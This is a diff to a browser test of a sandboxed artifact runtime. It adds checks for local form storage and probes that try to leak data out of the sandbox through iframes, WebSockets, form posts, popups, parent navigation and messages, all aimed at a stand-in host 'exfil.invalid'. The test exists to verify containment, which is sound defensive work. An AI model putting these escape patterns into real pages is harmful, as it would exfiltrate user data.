@@ -33,7 +33,7 @@ await page.route('**/*',async route=>{
 });
 try {
   await page.goto(host+'/');await page.waitForFunction(()=>window.artifacts);
-  const html=`<!doctype html><html><head><style>body{background:white;color:black}</style></head><body><parsererror hidden>&lt;img src="https://exfil.invalid/fallback"&gt;</parsererror><button id="count">0</button><script>document.querySelector('button').onclick=e=>e.target.textContent=Number(e.target.textContent)+1;console.log('runtime-ready');</script></body></html>`;
+  const html=`<!doctype html><html><head><style>body{background:white;color:black}</style></head><body><parsererror hidden>&lt;img src="https://exfil.invalid/fallback"&gt;</parsererror><button id="count">0</button><form id="local-form"><input id="form-value"><button type="submit">Save locally</button></form><output id="form-result"></output><script>document.querySelector("form").onsubmit=async event=>{event.preventDefault();const value=document.querySelector("#form-value").value;await dsmack.storage.put("form-key",value);document.querySelector("#form-result").textContent=value};document.querySelector('button').onclick=e=>e.target.textContent=Number(e.target.textContent)+1;console.log('runtime-ready');</script></body></html>`;
   await page.evaluate(async html=>window.artifacts.tool.execute('create1',{command:'create',filename:'test.html',content:html}),html);
   let app;
   for (let attempt=0; attempt<100&&!app; attempt++) {
@@ -47,6 +47,10 @@ try {
     new Promise((_,reject)=>setTimeout(()=>reject(new Error('Console acknowledgement missing after 2s')),2000)),
   ]));
   assert.equal(acknowledgement.success,true,'console request receives the source-bound host acknowledgement');
+  await app.locator('#form-value').fill('LOCAL_FORM_STATE');
+  await app.getByRole('button',{name:'Save locally'}).click();
+  await app.waitForFunction(()=>document.querySelector('#form-result').textContent==='LOCAL_FORM_STATE');
+  assert.equal(await app.evaluate(()=>dsmack.storage.get('form-key')),'LOCAL_FORM_STATE','preventDefault form handler can update scoped storage');
   const sdk = await app.evaluate(async () => {
     await dsmack.ready();
     await dsmack.storage.put('sdk-key',{secret:'BROWSER_ONLY_ARTIFACT_STATE'});
@@ -58,7 +62,7 @@ try {
   });
   assert.ok(sdk.frozen&&sdk.hasStorage);
   assert.deepEqual(sdk.value,{secret:'BROWSER_ONLY_ARTIFACT_STATE'});
-  assert.deepEqual(sdk.keys,['sdk-key']);
+  assert.deepEqual(sdk.keys.sort(),['form-key','sdk-key']);
   assert.equal(sdk.denied,'NOT_AVAILABLE');
   assert.ok(!JSON.stringify(sdk.credit).includes('NEVER_EXPOSE'));
   assert.equal(await page.evaluate(()=>JSON.stringify([...records.values()]).includes('BROWSER_ONLY_ARTIFACT_STATE')),false);
@@ -120,6 +124,7 @@ try {
     const frame=document.createElement('iframe');frame.src='https://exfil.invalid/frame';document.body.append(frame);
     try{new WebSocket('wss://exfil.invalid/socket')}catch{}
     const form=document.createElement('form');form.action='https://exfil.invalid/form';document.body.append(form);form.submit();
+    const sameOriginForm=document.createElement('form');sameOriginForm.action=sandbox+'/loader.html?form=must-not-leave';document.body.append(sameOriginForm);sameOriginForm.submit();
     window.open('https://exfil.invalid/popup');
     parent.postMessage({type:'open-external-url',url:'https://exfil.invalid/bridge'},'*');
     try{parent.location.href=sandbox+'/loader.html?secret=parent'}catch{}
